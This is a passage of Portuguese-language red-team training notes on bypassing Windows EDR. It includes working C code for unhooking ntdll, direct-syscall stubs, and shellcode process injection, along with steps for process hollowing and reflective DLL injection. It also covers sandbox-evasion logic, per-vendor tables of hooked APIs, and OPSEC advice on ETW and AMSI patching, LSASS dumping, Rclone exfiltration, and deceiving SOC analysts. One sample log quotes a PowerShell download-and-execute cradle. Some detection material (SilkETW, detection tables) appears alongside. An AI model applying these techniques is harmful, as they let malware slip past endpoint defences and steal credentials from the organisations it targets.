  [E9 XX XX XX XX]  jmp EDR_NtAllocateVirtualMemory_Hook   ← 5 bytes JMP
  [00 00 00]        (bytes destruídos, não mais instrução válida)
  [0F 05]       syscall   ← ainda presente mas nunca alcançado diretamente
  [C3]          ret
```

**Para x64, hooks mais robustos usam 14 bytes (JMP absoluto)**:

```
FF 25 00 00 00 00   jmp [rip+0]
XX XX XX XX         endereço baixo do hook (8 bytes)
XX XX XX XX
```

**Código do EDR hook**:

```c
// Trampoline: salva os bytes originais + JMP de volta
typedef struct _HOOK_TRAMPOLINE {
    BYTE OriginalBytes[14];    // Bytes originais da função
    BYTE JmpBack[14];          // JMP de volta para função original+14
} HOOK_TRAMPOLINE, *PHOOK_TRAMPOLINE;

BOOL InstallInlineHook(
    PVOID TargetFunction,      // NtAllocateVirtualMemory
    PVOID HookFunction,        // EDR_NtAllocateVirtualMemory
    PHOOK_TRAMPOLINE Trampoline)
{
    // 1. Salvar bytes originais
    memcpy(Trampoline->OriginalBytes, TargetFunction, 14);
    
    // 2. Construir JMP de volta (após os 14 bytes do hook)
    // ...
    
    // 3. Tornar função writable
    DWORD oldProtect;
    VirtualProtect(TargetFunction, 14, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 4. Escrever JMP para nosso hook
    // 14-byte absolute JMP:
    BYTE jmpPatch[] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp [rip+0]
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // endereço
    };
    *(PVOID*)(jmpPatch + 6) = HookFunction;
    memcpy(TargetFunction, jmpPatch, 14);
    
    // 5. Restaurar proteção
    VirtualProtect(TargetFunction, 14, oldProtect, &oldProtect);
    
    return TRUE;
}
```

### Detectar Hooks — Verificar Primeiros Bytes

```c
// Verificar se ntdll.dll está hookada
// Funções limpas em x64 começam com:
//   4C 8B D1  mov r10, rcx  (para Nt* syscall stubs)
//   48 89 xx  para outras funções

BOOL IsNtFunctionHooked(LPCSTR functionName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID funcAddr = GetProcAddress(hNtdll, functionName);
    
    BYTE* bytes = (BYTE*)funcAddr;
    
    // JMP hook = começa com E9 (rel JMP) ou FF 25 (abs JMP)
    if (bytes[0] == 0xE9 || (bytes[0] == 0xFF && bytes[1] == 0x25)) {
        printf("[HOOKED] %s\n", functionName);
        return TRUE;
    }
    
    // Verificar se primeiro byte é 0x4C (mov r10, rcx — legítimo)
    if (bytes[0] != 0x4C) {
        printf("[POSSIVELMENTE HOOKED] %s — primeiro byte: 0x%02X\n", 
               functionName, bytes[0]);
        return TRUE;
    }
    
    return FALSE;
}

// Exemplo de uso
const char* criticalFunctions[] = {
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "LdrLoadDll",
    NULL
};

for (int i = 0; criticalFunctions[i] != NULL; i++) {
    IsNtFunctionHooked(criticalFunctions[i]);
}
```

### Técnicas de Unhooking

#### Técnica 1: Remap ntdll do Disco

Carregar uma cópia limpa da ntdll.dll diretamente do disco e usar seus endereços de função, evitando a versão hookada em memória.

```c
BOOL UnhookNtdllViaRemap()
{
    HANDLE hFile, hMapping;
    PVOID pMappedView;
    
    // 1. Abrir ntdll.dll do disco
    hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);
    
    // 2. Criar mapping da cópia limpa
    hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    pMappedView = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    
    // 3. Encontrar ntdll em memória (versão hookada)
    HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
    
    // 4. Copiar seção .text da versão limpa sobre a hookada
    // Encontrar seção .text
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMappedView;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)pMappedView + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            PVOID hookDest = (BYTE*)hHookedNtdll + pSection->VirtualAddress;
            PVOID cleanSrc = (BYTE*)pMappedView + pSection->VirtualAddress;
            SIZE_T secSize = pSection->Misc.VirtualSize;
            
            // Tornar writable
            DWORD oldProtect;
            VirtualProtect(hookDest, secSize, PAGE_EXECUTE_WRITECOPY, &oldProtect);
            
            // Copiar bytes limpos
            memcpy(hookDest, cleanSrc, secSize);
            
            // Restaurar
            VirtualProtect(hookDest, secSize, oldProtect, &oldProtect);
            break;
        }
    }
    
    UnmapViewOfFile(pMappedView);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}
```

#### Técnica 2: Direct Syscalls (SSN + instrução syscall)

Ao invés de chamar `NtAllocateVirtualMemory` via ntdll (que pode estar hookada), usar a instrução `syscall` diretamente com o System Service Number (SSN) correto.

```asm
; NtAllocateVirtualMemory via direct syscall (MASM x64)
; Assume que o SSN está em eax antes da chamada

NtAllocateVirtualMemory PROC
    mov r10, rcx          ; System call convention: primeiro arg em r10
    mov eax, 18h          ; SSN hardcoded (perigoso — varia por build do Windows!)
    syscall               ; Instrução syscall entra em kernel mode
    ret
NtAllocateVirtualMemory ENDP
```

**Problema do hardcoding**: O SSN varia entre builds do Windows. A solução é determinar o SSN em runtime.

#### API Call Stack — Detecção Comportamental

EDRs modernos não dependem apenas de hooks para detecção. Eles analisam o **call stack** no momento da API call para determinar se a chamada é legítima.

**Stack legítima para VirtualAllocEx**:
```
kernel32!VirtualAllocEx
  ← process.exe!mallocCode+0x42
  ← process.exe!main+0x18
  ← kernel32!BaseThreadInitThunk
  ← ntdll!RtlUserThreadStart
```

**Stack suspeita (shellcode direto)**:
```
kernel32!VirtualAllocEx
  ← 0x00000202DEAD0000  (endereço em região não mapeada a módulo)
  ← 0x0000000000000000
```

**Como o EDR verifica**:

```c
// No hook do EDR, após interceptar a chamada:
BOOL IsCallStackLegitimate()
{
    PVOID stackTrace[64];
    WORD framesCaptured = CaptureStackBackTrace(0, 64, stackTrace, NULL);
    
    for (WORD i = 0; i < framesCaptured; i++) {
        // Verificar se cada endereço no stack pertence a um módulo carregado
        MEMORY_BASIC_INFORMATION mbi;
        VirtualQuery(stackTrace[i], &mbi, sizeof(mbi));
        
        if (mbi.Type != MEM_IMAGE) {
            // Endereço não pertence a imagem mapeada = suspeito
            return FALSE;
        }
        
        // Verificar se o módulo tem assinatura válida
        WCHAR modulePath[MAX_PATH];
        GetMappedFileNameW(GetCurrentProcess(), mbi.AllocationBase,
                          modulePath, MAX_PATH);
        // Verificar assinatura do módulo...
    }
    return TRUE;
}
```

---

## Na Prática — PARTE 3: SilkETW para Monitoramento

### Setup e Configuração

SilkETW é uma ferramenta para consumo e análise de eventos ETW, útil tanto para Blue Team quanto para Red Team (entender o que está sendo gerado).

```powershell
# Download e configuração básica
# https://github.com/fireeye/SilkETW

# Coletar eventos de um provider específico por nome
.\SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\Logs\kernel_process.json

# Coletar eventos por GUID
.\SilkETW.exe -t user -pg {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716} -ot file -p C:\Logs\output.json

# Coletar eventos do kernel logger (session de kernel)
.\SilkETW.exe -t kernel -kw 0x10 -ot file -p C:\Logs\kernel.json
# -kw 0x10 = PROCESS (bitmask de kernel events)

# Coletar PowerShell ETW (detecção de script block logging)
.\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p C:\Logs\ps.json

# Com filtro YARA para detecção em tempo real
.\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell `
    -ot eventlog -p Microsoft-SilkETW `
    -y C:\Yara\rules.yar
```

### Exemplos de Saída de Eventos por Técnica

#### Process Injection — VirtualAllocEx detectado via ETW-TI

```json
{
  "EventHeader": {
    "ProcessId": 4821,
    "ThreadId": 4824,
    "TimeStamp": "2024-01-15T14:23:11.4521043Z"
  },
  "Payload": {
    "ProviderName": "Microsoft-Windows-Threat-Intelligence",
    "EventName": "KERNEL_THREATINT_TASK_ALLOCVM_REMOTE",
    "TargetProcessId": 892,
    "TargetProcessFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
    "BaseAddress": "0x000001E2AB000000",
    "RegionSize": 4096,
    "AllocationType": "0x3000",
    "Protect": "0x40",
    "CallingProcessId": 4821,
    "CallingProcessFileName": "\\Device\\HarddiskVolume3\\Users\\user\\malware.exe",
    "CallingProcessSignatureLevel": "Unchecked",
    "TargetProcessSignatureLevel": "Windows"
  }
}
```

#### Credential Dumping — ReadProcessMemory em LSASS

```json
{
  "EventHeader": {
    "ProcessId": 6543,
    "ThreadId": 6547
  },
  "Payload": {
    "ProviderName": "Microsoft-Windows-Threat-Intelligence",
    "EventName": "KERNEL_THREATINT_TASK_READREMOTEPROCESS",
    "TargetProcessId": 892,
    "TargetProcessFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
    "BytesRead": 1048576,
    "RemoteBaseAddress": "0xFFFF8A0012340000",
    "CallingProcessFileName": "\\Device\\HarddiskVolume3\\temp\\mimikatz.exe",
    "CallingProcessSignatureLevel": "Unchecked"
  }
}
```

#### PowerShell Script Block Logging

```json
{
  "EventHeader": {
    "ProcessId": 3421
  },
  "Payload": {
    "ProviderName": "Microsoft-Windows-PowerShell",
    "EventId": 4104,
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
    "ScriptBlockId": "{A1B2C3D4-...}",
    "Path": ""
  }
}
```

#### DLL Injection via LoadImage Callback (reconstituído de eventos Sysmon)

```json
{
  "EventHeader": {
    "ProcessId": 4821
  },
  "Payload": {
    "EventId": 7,
    "Image": "C:\\Windows\\System32\\notepad.exe",
    "ImageLoaded": "C:\\Users\\user\\AppData\\Local\\Temp\\evil.dll",
    "FileVersion": "",
    "Description": "",
    "Product": "",
    "Company": "",
    "OriginalFileName": "",
    "Hashes": "SHA256=DEADBEEF...",
    "Signed": "false",
    "Signature": "",
    "SignatureStatus": "Unavailable"
  }
}
```

---

## Detecção e OPSEC

### Resumo de Detecções por Vetor

| Técnica | Mecanismo de Detecção | Provider/Callback |
|---|---|---|
| CreateRemoteThread | Thread notify callback + ETW-TI | PsSetCreateThreadNotify |
| VirtualAllocEx RWX remoto | ETW-TI evento 10 | KERNEL_THREATINT |
| ReadProcessMemory em LSASS | ETW-TI evento 8 + ObCallback | KERNEL_THREATINT |
| DLL Load de path suspeito | LoadImage callback | PsSetLoadImageNotify |
| Processo filho suspeito | Process notify callback | PsSetCreateProcessNotify |
| Registry persistence | CmRegisterCallback | RegistryCallback |
| PS Script malicioso | ETW Provider PowerShell | Event ID 4104 |
| API hook detectada | Comparação de bytes IAT/inline | [verificação manual] |

### OPSEC para Red Team

```
1. SEMPRE verificar hooks antes de chamar APIs críticas
   → Implementar função de detecção de hooks no início do implant

2. Preferir syscalls diretas para operações críticas
   → NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx

3. Evitar padrões de call stack anômalos
   → Usar Stack Spoofing (ver arquivo 08_runtime_evasion_sleepmask.md)

4. ETW patching para reduzir visibilidade
   → Patch de EtwEventWrite em ntdll.dll (ver arquivo 08)
   → Atenção: alguns EDRs detectam o próprio patch

5. Não fazer ReadProcessMemory em LSASS diretamente
   → Usar snapshot de minidump via comsvcs.dll
   → Ou acessar LSASS via shadow copy

6. Injeção em processos de alta integridade é mais visível
   → Preferir processos de baixa visibilidade (svchost, explorer)
   → Verificar se processo-alvo tem DLL do EDR injetada
```

### Verificar DLL do EDR no Processo

```powershell
# Listar módulos carregados no processo alvo
$processId = 4821
$process = [System.Diagnostics.Process]::GetProcessById($processId)
$process.Modules | Select-Object ModuleName, FileName | 
    Where-Object { $_.FileName -notmatch "System32|SysWOW64|Program Files" }

# Nomes comuns de DLLs EDR (parcial):
# CrowdStrike: CSFalconService.dll, 
# SentinelOne: InProcessClient64.dll
# Carbon Black: RepMgr.dll
# Cylance: CylanceSvc.dll
```

---

## Técnicas Comportamentais e Bypass de EDR (MalTrak)

> Conteúdo derivado do Módulo 10 do curso MalTrak: "Defense Evasion: Behavioral & EDR Bypass".

---

### Detecção Comportamental vs. Detecção por Assinatura

EDRs modernos operam em dois planos simultâneos:

- **Assinatura**: compara hashes e padrões de bytes conhecidos (AV tradicional). Facilmente contornado com ofuscação ou packing.
- **Comportamental**: monitora sequências de chamadas de API, árvores de processos, alocações de memória e fluxo de execução em tempo real. Muito mais difícil de contornar porque não depende de reconhecer o malware em si — depende de reconhecer o que o malware *faz*.

O EDR injeta sua DLL em todos os processos e hooks as APIs críticas. Quando o malware chama `VirtualAllocEx`, o EDR intercepta a chamada, lê os parâmetros (endereço-alvo, tamanho, permissões), registra a operação no SIEM e decide se bloqueia ou deixa passar.

**Limitação estrutural dos EDRs modernos**: antigamente, AVs hookavam funções em Kernel Mode. A Microsoft impediu isso com o **PatchGuard** (Kernel Patch Protection). Hoje todos os hooks de EDR acontecem em User Mode — o que significa que estamos no mesmo espaço de endereçamento. Podemos manipulá-los.

---

### Evasão Comportamental: Sandbox Evasion

Sandboxes analisam arquivos suspeitos e anexos de e-mail em ambientes controlados antes de entregá-los ao usuário. Detectar que o malware está em sandbox e se comportar de forma inocente é uma das camadas mais fundamentais de evasão comportamental.

#### Por que sandboxes são detectáveis

Sandboxes têm pouca ou nenhuma interação humana e nenhuma personalização. Características que as denunciam:

- **Árvore de arquivos no C:** — sandboxes tipicamente têm estrutura de diretórios minimalista, sem pastas de usuário reais
- **Nomes de usuário genéricos** — `User`, `Lab`, `sandbox`, `malware`, etc.
- **Pouca ou nenhuma atividade do mouse** — verificável via `GetCursorPos()`: se o cursor não se move entre chamadas repetidas, provavelmente é sandbox
- **Nenhum outro processo sendo criado ou encerrado** — máquinas reais têm atividade constante de processos em background
- **Processos de VM rodando** — `vmtoolsd.exe`, `vmwaretray.exe`, `vboxservice.exe`, `vboxtray.exe`, etc.
- **Ausência de aplicações customizadas** — nenhum Chrome, nenhuma ferramenta de terceiros instalada
- **Sistema nunca reiniciou** — o malware pode persistir e esperar um reboot antes de executar payload

#### Nota sobre detecção de VMs em produção

Um problema operacional importante: VMs são amplamente usadas em servidores de produção (vCenter, Hyper-V, como Dockers). Terminar o malware automaticamente ao detectar VM pode ser um erro grave se o alvo real roda em VM. O malware deve primeiro investigar o sistema:

- A VM tem Oracle rodando?
- Tem aplicações instaladas (indicativo de uso real)?
- Parece uma máquina de usuário customizada ou um template genérico?

Se parecer VM de produção, executar normalmente. Só abortar se parecer sandbox isolada.

---

### Disfarce como Aplicação Legítima: Process Injection

#### Conceito e motivação

Process injection é a capacidade de injetar código, dados de memória ou uma DLL dentro de outro processo. Ao fazer isso, o malware executa dentro do espaço de endereçamento de um processo legítimo e confiável, como `svchost.exe`, `explorer.exe` ou `iexplore.exe`.

**Por que usar process injection:**

- Técnica de anti-engenharia reversa (o malware não existe como binário separado)
- Bypass de firewall: o tráfego de rede sai sob o nome de `iexplore.exe` ou `chrome.exe`, não do malware
- Disfarça a atividade maliciosa do usuário e de incident handlers (embora Volatility ainda consiga detectar)
- Dá controle sobre o processo hospedeiro (ataques man-in-the-middle dentro do processo)
- Possibilita malware totalmente residente em memória — zero evidência em disco

O Windows por design permite que processos leiam e escrevam na memória de outros processos e criem threads neles. Também permite alterar o contexto de threads (incluindo registradores como EIP/RIP).

Técnicas complementares: DLL Side Loading, DLL Hijacking e métodos de persistência que executam DLLs alcançam o mesmo objetivo de execução dentro de contexto legítimo.

#### Fluxo clássico de Process Injection (shellcode injection)

```
1. CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
   → snapshot de todos os processos em execução

2. Process32First / Process32Next
   → iterar para encontrar o processo-alvo por nome

3. OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
   → obter handle com permissão de escrita

4. VirtualAllocEx(process_handle, NULL, sizeof(shellcode),
                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
   → alocar memória RWX no processo remoto

5. WriteProcessMemory(process_handle, pointer_after_allocated,
                      shellcode, sizeof(shellcode), 0)
   → escrever o shellcode na memória alocada

6. CreateRemoteThread(process_handle, NULL, 100,
                      (LPTHREAD_START_ROUTINE)pointer_after_allocated,
                      NULL, NULL, 0x50002)
   → criar thread no processo remoto que inicia no shellcode
```

Código de referência do slide (fonte: github.com/mhaskar/shellcode-process-injection):

```c
// Alocar memória no processo remoto
pointer_after_allocated = VirtualAllocEx(process_handle, NULL,
    sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if (pointer_after_allocated == NULL) {
    puts("[-]Error while get the base address to write\n");
} else {
    printf("[+]Got the address to write 0x%x%x\n", pointer_after_allocated);
}

// Escrever o shellcode
if (WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated,
                       (LPCVOID)shellcode, sizeof(shellcode), 0)) {
    puts("[+]Injected\n");
    puts("[+]Running the shellcode as new thread !\n");

    // Criar thread e executar o shellcode
    CreateRemoteThread(process_handle, NULL, 100,
        (LPTHREAD_START_ROUTINE)pointer_after_allocated,
        NULL, NULL, 0x50002);
} else {
    puts("Not Injected\n");
}
```

Código de scan de processos (fonte: github.com/AmrThabet/winSRDF):

```c
hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (hProcessSnap == INVALID_HANDLE_VALUE) {
    isSuccess = false;
    if (logObj == NULL)
        logObj->WriteToLog("CreateToolhelp32Snapshot (of processes)");
}

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcessSnap, &pe32)) {
    isSuccess = false;
    if (logObj == NULL)
        logObj->WriteToLog("Process32First");
    CloseHandle(hProcessSnap);
}

ProcessList.AddItem((cString)pe32.szExeFile, (cString)pe32.th32ProcessID);

while (Process32Next(hProcessSnap, &pe32)) {
    ProcessList.AddItem((cString)pe32.szExeFile, (cString)pe32.th32ProcessID);
}

CloseHandle(hProcessSnap);
isSuccess = true;
```

#### Process Hollowing (Injeção Avançada)

Process Hollowing cria um processo legítimo em modo suspenso, esvazia sua imagem da memória e carrega o malware no lugar. O processo resultante tem o nome e PID de um binário confiável mas executa código malicioso.

```
1. CreateProcess("C:\Windows\System32\svchost.exe", ..., CREATE_SUSPENDED, ...)
   → criar processo legítimo em modo suspenso

2. ZwUnmapViewOfSection(hProcess, imageBase)
   → desalocar/esvaziar o módulo principal do processo

3. Carregar o PE do malware usando um PE Loader embutido
   → ou injetar código que carrega o PE, resolve imports e corrige a tabela IAT

4. GetThreadContext(hThread, &ctx)
   → obter contexto da thread suspensa (registradores)

5. SetThreadContext(hThread, &ctx)  // modificar EIP/RIP para apontar ao malware
   → redirecionar o entry point para o código malicioso

6. ResumeThread(hThread)
   → retomar execução — agora executa o malware
```

#### Reflective DLL Injection

Injeção de DLL sem necessidade de escrever arquivo em disco. A DLL carrega a si mesma usando um loader escrito em assembly (shellcode):

- O loader é injetado junto com a DLL como shellcode
- Sua função é mapear a DLL na memória exatamente como o Windows Loader faria (processar relocations, resolver imports, chamar DllMain)
- Requer entendimento profundo de assembly e PE Header

**Ferramenta: sRDI** (Shell Reflective DLL Injection)
- Repositório: `https://github.com/monoxgas/sRDI`
- Converte qualquer DLL em shellcode auto-suficiente:

```powershell
ConvertTo-Shellcode -File TestDLL_x86.dll
```

O resultado é injetável diretamente em outro processo via `WriteProcessMemory` + `CreateRemoteThread` sem precisar que o processo-alvo chame `LoadLibrary`.

---

### API Hooking — Perspectiva do EDR e do Atacante

#### Como o EDR instala hooks

O Windows facilita o hooking porque a maioria das funções de API em 32-bit começa com um prólogo de 5 bytes substituível:

```asm
mov edi, edi   ; 2 bytes  ← instrução "inútil" (hotpatch placeholder)
push ebp       ; 1 byte
mov ebp, esp   ; 2 bytes
; Total: 5 bytes — exatamente o tamanho de um CALL relativo
```

O EDR substitui esses 5 bytes por:

```asm
call $xxxxxxxx   ; 5 bytes → redireciona para código do EDR
```

Quando a API é chamada:
1. Execução vai para o código do EDR
2. EDR lê parâmetros, registra operação, decide se bloqueia
3. EDR executa os 5 bytes originais salvos (trampoline) e `jmp` de volta para o restante da API:

```asm
push ebp
mov ebp, esp
jmp <continue_the_API_code>
```

#### AIT Hooking (Address Import Table Hooking)

Variante que modifica a Import Address Table em vez dos bytes da função:

- Modifica os endereços na tabela de importação para apontar ao código do EDR
- No final do código do EDR, `jmp` para a API real
- **Fraqueza**: só intercepta chamadas que passam pela IAT — chamadas dinâmicas via `GetProcAddress` ou DLLs com sua própria IAT não são interceptadas
- Mais simples de implementar e mais "limpo", mas ainda raramente usado em relação ao hooking inline

#### Fluxo completo de uma syscall monitorada pelo EDR

```
Call To Function FindFirstFile()
        ↓
FindFirstFile() chama ZwQueryDirectoryFile
        ↓
Execute SYSENTER/SYSCALL instruction with Function Number (0x91)
        ↓ (cruzamento User Mode → Kernel Mode)
Search For Function (0x91) in The System Service Dispatch Table (SSDT)
        ↓
Execute NtQueryDirectoryFile()
        ↓
Send an IRP Request to fastfat.sys (e todos os Device drivers associados)
        ↓
Attached Devices podem modificar os inputs do IRP Request (Pre-operation Mode)
        ↓
Attached Devices podem definir IoCompletion Routine para modificar outputs (Post-operation Mode)
        ↓
Enviar sinal ao device → outputs → executar IoCompletion Routines → retornar ao usuário
```

---

### Bypass de EDR: As Quatro Opções Estratégicas

Cada EDR hooks um conjunto diferente de APIs e alerta em comportamentos diferentes. A estratégia de bypass depende de qual API está hookada no produto-alvo.

**Tabela parcial de APIs hookadas por EDR** (conforme slides MalTrak):

| API | SentinelOne | Sophos | CrowdStrike | Cylance | DeepInstinct | CarbonBlack |
|---|---|---|---|---|---|---|
| KiUserApcDispatcher | TRUE | TRUE | FALSE | FALSE | FALSE | FALSE |
| LdrLoadDll | TRUE | TRUE | FALSE | FALSE | FALSE | FALSE |
| NtAllocateVirtualMemory | TRUE | TRUE | FALSE | TRUE | FALSE | TRUE |
| NtCreateProcess | FALSE | FALSE | FALSE | TRUE | TRUE | FALSE |
| NtCreateSection | TRUE | FALSE | FALSE | FALSE | TRUE | FALSE |
| NtCreateThread | FALSE | FALSE | FALSE | TRUE | FALSE | TRUE |

#### Opção 1: Unhook as APIs

A maioria dos hooks acontece nas APIs `Zw*` / `Nt*` — são as que chamam `SYSENTER` (x86) ou `SYSCALL` (x64). O EDR sobrescreve as 2 instruções iniciais (incluindo o syscall ID / SSN).

Para desfazer o hook precisamos de dois elementos:

**1. O Syscall ID (SSN) original**

O SSN varia entre versões do Windows. Duas abordagens:

- **Opção A**: Abrir `NTDLL.dll` do disco (versão limpa, não hookada), fazer parse do PE Header e extrair os SSNs originais das funções
- **Opção B**: Usar o projeto **SysWhispers** que mantém uma biblioteca completa de syscall IDs de Windows 7 a Windows 11, e pode gerar código para chamar as APIs diretamente via syscall ID

```
SysWhispers: https://github.com/jthuraisamy/SysWhispers
```

**2. Tornar a memória da função writable**

- Opção direta: `VirtualProtect()` na região da função (PAGE_EXECUTE_READWRITE ou PAGE_EXECUTE_WRITECOPY)
- Opção via syscall: usar o próprio SysWhispers com `NtProtectVirtualMemory` via SSN

#### Opção 1b: Unhook Discreto (sem modificar a ntdll em memória)

Abordagem mais stealth — não modifica a ntdll hookada, usa uma segunda instância limpa:

```
1. Copiar ntdll.dll do disco para um path diferente:
   %temp%\ntdll_new.dll

2. LoadLibrary("%temp%\ntdll_new.dll")
   → Windows carrega a cópia como biblioteca separada, sem hooks

3. GetProcAddress(hNtdllNew, "NtAllocateVirtualMemory")
   → obter endereço da função na cópia limpa (sem hook)

4. Usar esse endereço em vez da função hookada
```

Nota adicional do exercício prático do curso: é possível adicionar bytes aleatórios ao final da cópia da DLL para evitar que tenha o mesmo MD5 da original (detecção por hash de arquivo). Também é possível usar sRDI (Reflective DLL Loader) para carregar a ntdll copiada sem precisar escrever arquivo em disco.

Isso também é equivalente à técnica de remap via `MapViewOfFile` descrita na seção anterior deste documento — ambas chegam ao mesmo resultado de ter uma cópia limpa das funções Nt* sem os hooks do EDR.

#### Opção 2: Chamar APIs não-hookadas

Como cada EDR hooks um conjunto diferente de APIs, process injection pode ser feito de múltiplas formas usando combinações de APIs — algumas dessas combinações podem não estar hookadas em um produto específico:

```
Combinação A (clássica — mais detectada):
  OpenProcess → WriteProcessMemory → CreateRemoteThread

Combinação B (via SetThreadContext):
  OpenProcess/CreateProcess → VirtualAllocEx → WriteProcessMemory
  → SetThreadContext → ResumeThread

Combinação C (via APC):
  OpenProcess → WriteProcessMemory → QueueAPCThread

Combinação D (via Section Objects — mais stealth):
  OpenProcess → CreateSection(Ex) → MapViewOfSection(Ex)
  → SetThreadContext → ResumeThread
```

A estratégia é verificar a tabela de APIs hookadas para o EDR-alvo e escolher a combinação que usa apenas APIs não-hookadas naquele produto.

#### Opção 3: Evitar Atividades Suspeitas (Blend In)

Mesmo usando APIs hookadas, é possível evitar alertas se o comportamento não corresponder às assinaturas comportamentais do EDR:

- **`CreateRemoteThread` é muito suspeito** — `SetThreadContext` é menos monitorado e alcança o mesmo resultado (redirecionar execução de thread)
- **Thread iniciando em memória privada (anônima) é altamente suspeito** — alternativa: iniciar a thread em código de uma biblioteca legítima apontando para uma instrução `ret`, e configurar a stack corretamente antes de retomar
- **Alocar grandes blocos de memória em outro processo é suspeito** — solução: alocar múltiplos blocos pequenos consecutivos (passam desapercebidos individualmente). Ferramenta: **DripLoader** (`https://github.com/xinbailu/DripLoader`)
- **Module Stomping**: carregar uma DLL legítima "sem importância" (maior que o malware) e depois sobrescrevê-la com o payload — o thread inicia dentro do range de endereços de uma imagem mapeada (MEM_IMAGE), o que não dispara detecção de "execução de memória privada"

#### Opção 4: Delegar Atividades a Outros Processos

Fazer com que processos legítimos realizem as operações maliciosas em nosso nome:

**Via COM Objects:**

```powershell
# Internet Explorer COM Object — tráfego de rede via iexplore.exe
$net = New-object -com "InternetExplorer.Application"
$net.navigate2("https://maltrak.com")
Start-Sleep -s 3
$this_document = $net.document
$this_document.IHTMLDocument2_body.innerHTML
```

O processo resultante é spawned como filho de `svchost.exe`, não do malware. Detecção: procurar flag `-embedded` no processo iexplore. A mesma técnica funciona com Chrome e outros browsers.

**Via COM Objects — outros exemplos:**

- **Scheduled Tasks**: usar `ITaskService` (COM) para agendar comandos — o executante é `taskhost.exe` / `svchost.exe`
- **BITS (Background Intelligent Transfer Service)**: `bitsadmin` via COM para download/execução — o tráfego aparece como BITS transfer legítima

**Via Aplicações Legítimas (Living off the Land):**

- **TeamViewer**: instalar e controlar a máquina diretamente via acesso remoto legítimo
- **RDP + Ngrok**: tunelizar conexões RDP através do Ngrok para C2 encoberto (`ngrok tcp 3389`)
- **Rclone**: exfiltrar dados para cloud storage (Google Drive, S3, etc.) — tráfego aparece como sincronização de arquivos legítima

---

### AMSI Bypass (Contexto EDR)

O AMSI (Anti-Malware Scanning Interface) é uma camada complementar ao EDR, introduzida pela Microsoft:

- Funciona via `amsi.dll` carregada em processos de scripting (PowerShell, VBScript, JScript, etc.)
- É principalmente um scanner de assinatura, não comportamental
- Scaneias cada chamada a `Invoke-Expression` (IEX) e buffers de script antes da execução
- Pode ser integrado ao AV/EDR para passar os buffers para o engine de detecção

Arquitetura AMSI:

```
PowerShell / VBScript / Outras aplicações
        ↓
AmsiScanBuffer() / AmsiScanString()  [amsi.dll]
        ↓
IAntiMalware::Scan()  [amsi.h + amsi.dll]
        ↓
Windows Defender Provider / 3rd Party AV Provider
        ↓ (via RPC)
MsMpEng.exe → MpEngine.dll (Scan Engine) + MpSvc.dll (RPC Server)
```

O AMSI é essencialmente uma ponte entre o scripting engine e o AV engine — não é, por si só, um mecanismo comportamental como o EDR de kernel. Por isso é contornável via patching da função `AmsiScanBuffer` em memória (ver arquivo `08_runtime_evasion_sleepmask.md`).

---

### Filosofia Operacional de Defense Evasion (MalTrak)

Pontos estratégicos ensinados no módulo:

1. **Combinar técnicas** — nenhuma técnica isolada é suficiente. Combinar sandbox evasion + unhooking + process injection via APIs não-hookadas é mais eficaz que qualquer uma sozinha.

2. **Criatividade é necessária** — EDRs evoluem. Técnicas que funcionam hoje podem ser detectadas amanhã. Entender os *princípios* (por que o hook existe, o que ele detecta) permite criar variações novas.

3. **Não é necessário bypassar tudo** — times de SOC geralmente analisam apenas os 50% de alertas de maior prioridade (ou menos). Um malware que gera alertas de baixa severidade pode passar despercebido na prática.

4. **Engenharia social como complemento** — um EDR que alerta pode ser silenciado se um analista for convencido de que o alerta é falso positivo (exemplo: ligação se passando por suporte técnico do fornecedor).

5. **Blending in with the noise** — às vezes a melhor evasão é simplesmente parecer com tráfego e comportamento normal. Um `curl` para um domínio legítimo que faz relay de C2 é menos suspeito que um beacon periódico para IP desconhecido.

---

### Resumo de Técnicas e Ferramentas (MalTrak Módulo 10)

| Técnica | Ferramenta/API | MITRE ATT&CK |
|---|---|---|
| Sandbox detection | `GetCursorPos`, enumeração de processos | T1497 |
| Classic DLL Injection | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | T1055.001 |
| Process Hollowing | `CreateProcess(SUSPENDED)` + `ZwUnmapViewOfSection` + `SetThreadContext` | T1055.012 |
| Reflective DLL Injection | sRDI (`ConvertTo-Shellcode`) | T1055.001 |
